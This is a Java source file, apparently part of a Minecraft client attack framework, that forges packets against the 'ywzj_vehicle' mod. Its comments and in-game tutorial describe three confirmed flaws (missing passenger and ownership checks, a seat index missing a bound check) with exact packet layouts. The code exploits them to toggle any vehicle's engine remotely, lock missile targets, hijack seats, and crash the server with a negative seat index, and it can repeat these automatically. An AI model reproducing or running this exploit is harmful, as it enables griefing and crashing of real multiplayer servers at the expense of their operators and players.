package com.redblue.red.modules.limitlessvehicle;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.player.Player;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LV-01 + LV-07 + LV-08: Vehicle hijack via missing passenger/ownership checks.
 *
 * LV-01 (CONFIRMED): toggleEngine branch in onClientVehicleAction has NO
 *   hasPassenger(sender) check. Any player can toggle any vehicle's engine.
 *   Wire (index 101): writeInt(vehicleEntityId) + writeBool(false=leaveVehicle)
 *     + writeBool(true=toggleEngine)
 *
 * LV-07 (CONFIRMED): lockEntity branch requires getOwnOperatorUnit(sender) != null,
 *   meaning sender MUST be a weapon operator on the vehicle. Partially exploitable
 *   only when seated in a weapon seat.
 *   Wire (index 101): writeInt(vehicleEntityId) + writeBool(false) + writeBool(false)
 *     + writeBool(true=lockEntity) + writeInt(lockedEntityId)
 *
 * LV-08 (CONFIRMED): changeSeat has no lower-bound check (toSeat < 0 crashes)
 *   and uses > instead of >= for upper bound. Also no hasPassenger check.
 *   Wire (index 103): writeInt(vehicleEntityId) + writeInt(toSeat)
 */
public class LV01_VehicleHijack implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ywzj_vehicle", "ywzj_vehicle_channel");
    // Discriminator IDs from PacketId.value() -- NOT ordinal
    private static final int IDX_VEHICLE_ACTION = 101;
    private static final int IDX_CHANGE_SEAT = 103;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("action", "攻击动作", "TOGGLE_ENGINE",
                "TOGGLE_ENGINE", "LOCK_TARGET", "HIJACK_SEAT", "CRASH_SEAT"),
        ConfigParam.ofEntity("vehicle_id", "目标载具"),
        ConfigParam.ofEntity("lock_target_id", "锁定目标实体")
                .visibleWhen("action", "LOCK_TARGET"),
        ConfigParam.ofInt("seat_index", "目标座位", 0, 0, 15)
                .visibleWhen("action", "HIJACK_SEAT"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "lv01_vehicle_hijack"; }
    @Override public String name() { return "载具劫持"; }
    @Override public String description() { return "远程切换引擎/锁定导弹目标/劫持座位/崩溃座位索引"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 用准星选取按钮对准目标载具\n"
            + "2. 选择攻击动作:\n"
            + "   TOGGLE_ENGINE - 远程开关任意载具引擎(无需乘坐)\n"
            + "   LOCK_TARGET - 锁定任意实体为导弹目标(需坐在武器位)\n"
            + "   HIJACK_SEAT - 劫持载具座位(无乘客校验)\n"
            + "   CRASH_SEAT - 发送负数座位索引触发服务端异常\n"
            + "3. 点击执行或启用自动模式\n\n"
            + "[漏洞原理]\n"
            + "LV-01: toggleEngine分支无hasPassenger检查\n"
            + "LV-07: lockEntity仅检查getOwnOperatorUnit(需在武器位)\n"
            + "LV-08: changeSeat无下界检查且上界用>而非>=";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ywzj_vehicle");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doAction(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAction(mc);
    }

    private void doAction(Minecraft mc) {
        String action = getParam("action").map(ConfigParam::getString).orElse("TOGGLE_ENGINE");
        int vehicleId = getParam("vehicle_id").map(ConfigParam::getInt).orElse(0);
        if (vehicleId == 0) return;

        switch (action) {
            case "TOGGLE_ENGINE" -> sendToggleEngine(vehicleId);
            case "LOCK_TARGET" -> sendLockTarget(mc, vehicleId);
            case "HIJACK_SEAT" -> sendChangeSeat(vehicleId,
                    getParam("seat_index").map(ConfigParam::getInt).orElse(0));
            case "CRASH_SEAT" -> sendChangeSeat(vehicleId, -1);
        }
    }

    /** LV-01: toggleEngine -- no passenger check */
    private void sendToggleEngine(int vehicleId) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_VEHICLE_ACTION);
            buf.writeInt(vehicleId);
            buf.writeBoolean(false); // leaveVehicle
            buf.writeBoolean(true);  // toggleEngine (short-circuit return)
        });
    }

    /** LV-07: lockEntity -- requires weapon operator seat */
    private void sendLockTarget(Minecraft mc, int vehicleId) {
        int targetId = getParam("lock_target_id").map(ConfigParam::getInt).orElse(0);
        if (targetId == 0) return;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_VEHICLE_ACTION);
            buf.writeInt(vehicleId);
            buf.writeBoolean(false); // leaveVehicle
            buf.writeBoolean(false); // toggleEngine
            buf.writeBoolean(true);  // lockEntity
            buf.writeInt(targetId);  // lockedEntityId
        });
    }

    /** LV-08: changeSeat -- no lower bound check, no passenger check */
    private void sendChangeSeat(int vehicleId, int toSeat) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_CHANGE_SEAT);
            buf.writeInt(vehicleId);
            buf.writeInt(toSeat);
        });
    }
}
